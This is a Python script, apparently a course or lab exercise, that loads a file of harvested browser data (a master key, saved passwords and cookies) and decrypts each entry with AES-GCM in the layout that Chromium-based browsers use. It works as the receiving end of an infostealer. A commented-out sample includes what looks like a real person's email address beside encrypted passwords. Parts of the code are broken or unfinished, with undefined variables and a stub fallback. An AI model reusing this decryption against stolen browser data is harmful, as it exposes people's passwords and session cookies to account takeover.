from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from ctypes import *
from ctypes.wintypes import DWORD
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import shutil
from datetime import timezone, datetime, timedelta
import json

def decrypt_password(encrypted_password, key):
    try:
        #print(encrypted_password)
        #print(key)
        key = bytes.fromhex(key)
        encrypted_password = bytes.fromhex(encrypted_password)
        #print(key)
        # Parse the IV. This is a constnat used in AES GCM that we will talk about next week!
        # the IV will be in the same place across all machines
        iv = encrypted_password[3:15]
        # the actual ciphertext is the remaining bytes
        ciphertext = encrypted_password[15:]
        # Decrypt the password
        #print(len(key))
        
        cipher = AESGCM(key)
        pt = cipher.decrypt(iv, ciphertext, None).decode()
        #print("CT:", pt)
        #cipher = AES.new(key, AES.MODE_GCM, iv)
        # return cipher.decrypt(ciphertext)[:-16].decode()
        return pt
    except Exception as e:
        print(Exception, e,)
        # if the above fails, it is possible that your browsert is OLD
        # in that case, you can just directly call the DPAPI
        try:
            print("yahoo")
            #return str(decrypt_data_dpapi(ciphertext))
        except:
            # not supported
            return ""

def parsejson(results):
    json_res = json.loads(results)
    key = json_res['KEY']
    cookies = json_res['COOKIES']
    passwords = json_res['PASSWORDS']
   
    for row in json_res["RECORDS"]:
        usernames.append(row["username"])
        passwords.append(decrypt_password(row["password"]  ,key))
        urls.append(row["url"])
    print(usernames)
    print(passwords)
    print(urls)

def main():
    #test = '{"KEY":"1babf62120fc3ac18da6b95fb3b6271013b8e957535eda157c6a1581cbf12bc9","RECORDS":[{"password":"763130755d3e730a7236ed1b2d9957996ee22ad8df0d73becedb4562c479e52c2402673c5e7c860072654a","url":"https://www.walmart.com/","username":"wyattmorris24@gmail.com"},{"password":"7631300c0af71d93a79cfdb5343e49c1d3a2f56245769f1d4bd182b1444736f61d0ec1e24b7cdb99a6135fcaf8a394f1ee23","url":"https://ndscindv.com/","username":"dfvndfvn"},{"password":"763130aa082079b9e560b3c6b3886fbccdcf79cd14f0e2115307fc69189eabc8f1ced908f8e16ccf","url":"https://a.com/","username":"bcool"}]}'
    f = open("../newbad.txt", 'r')
    g = f.read()
    a = json.loads(g)
    
    json_res = a['response_data']
    key = json_res['KEY']
    cookies = json_res['COOKIES']
    passwords = json_res['PASSWORDS']
    username_list = []
    password_list = []
    url_list = []
    host_key_list = []
    encrypted_value_list = []

    for user in passwords:
        for entry in passwords[user]:
            password_list.append(decrypt_password(entry['password'], key))
            username_list.append(entry['username'])
            url_list.append(entry['url'])
    
    #print(password_list)
    for user in cookies:
        for entry in cookies[user]:
            host_key_list.append(entry['HOST_KEY'])
            encrypted_value_list.append(decrypt_password(entry['encrypted value'], key))
            
        
    

    

main()
